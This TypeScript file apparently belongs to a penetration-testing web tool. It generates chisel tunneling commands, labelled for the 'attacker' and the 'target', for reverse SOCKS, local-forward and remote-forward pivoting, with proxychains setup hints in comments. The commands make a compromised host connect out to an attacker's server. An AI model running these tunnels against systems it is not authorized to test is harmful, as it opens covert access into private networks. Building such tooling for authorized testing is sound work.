import { ChiselPivot } from "@/app/hooks/useChiselPivot";
import { PivotCommands, CommandStep } from "@/app/types/tool";

function chiselBin(os: "linux" | "windows"): string {
  return os === "windows" ? "./chisel.exe" : "./chisel";
}

export function resolvePivotCommands(pivot: ChiselPivot): PivotCommands {
  const cmds: PivotCommands = { attacker: [], target: [] };
  let step = 1;

  const serverIP = pivot.serverIP?.trim() ? pivot.serverIP : "<SERVER_IP>";
  const serverBin = chiselBin(pivot.serverOS);
  const clientBin = chiselBin(pivot.clientOS);

  function a(command: string): CommandStep {
    return { step: step++, command };
  }
  function t(command: string): CommandStep {
    return { step: step++, command };
  }

  if (pivot.mode === "reverse-socks") {
    // Attacker runs the server
    cmds.attacker.push(
      a(`${serverBin} server --port ${pivot.serverPort} --reverse --socks5`)
    );
    cmds.attacker.push(
      a(`# Add to /etc/proxychains.conf:\n#    socks5 127.0.0.1 ${pivot.socksPort}`)
    );
    cmds.attacker.push(
      a(`# Example: proxychains curl http://${serverIP}`)
    );

    // Target runs the client
    cmds.target.push(
      t(`${clientBin} client ${serverIP}:${pivot.serverPort} R:socks`)
    );
  } else if (pivot.mode === "local-forward") {
    // Attacker runs the server (no --reverse needed)
    cmds.attacker.push(
      a(`${serverBin} server --port ${pivot.serverPort}`)
    );

    // Target runs the client with local forward
    for (const f of pivot.forwards) {
      const remoteHost = f.remoteHost?.trim() ? f.remoteHost : "<REMOTE_HOST>";
      cmds.target.push(
        t(`${clientBin} client ${serverIP}:${pivot.serverPort} ${f.localPort}:${remoteHost}:${f.remotePort}`)
      );
      cmds.attacker.push(
        a(`# Access: http://localhost:${f.localPort}`)
      );
    }

    if (pivot.forwards.length === 0) {
      cmds.target.push(
        t(`${clientBin} client ${serverIP}:${pivot.serverPort} <localPort>:<remoteHost>:<remotePort>`)
      );
    }
  } else if (pivot.mode === "remote-forward") {
    // Attacker runs the server with --reverse
    cmds.attacker.push(
      a(`${serverBin} server --port ${pivot.serverPort} --reverse`)
    );

    // Target runs the client with R: (reverse) forward
    for (const f of pivot.forwards) {
      const remoteHost = f.remoteHost?.trim() ? f.remoteHost : "<REMOTE_HOST>";
      cmds.target.push(
        t(`${clientBin} client ${serverIP}:${pivot.serverPort} R:${f.localPort}:${remoteHost}:${f.remotePort}`)
      );
      cmds.attacker.push(
        a(`# Access: http://localhost:${f.localPort}`)
      );
    }

    if (pivot.forwards.length === 0) {
      cmds.target.push(
        t(`${clientBin} client ${serverIP}:${pivot.serverPort} R:<localPort>:<remoteHost>:<remotePort>`)
      );
    }
  }

  return cmds;
}
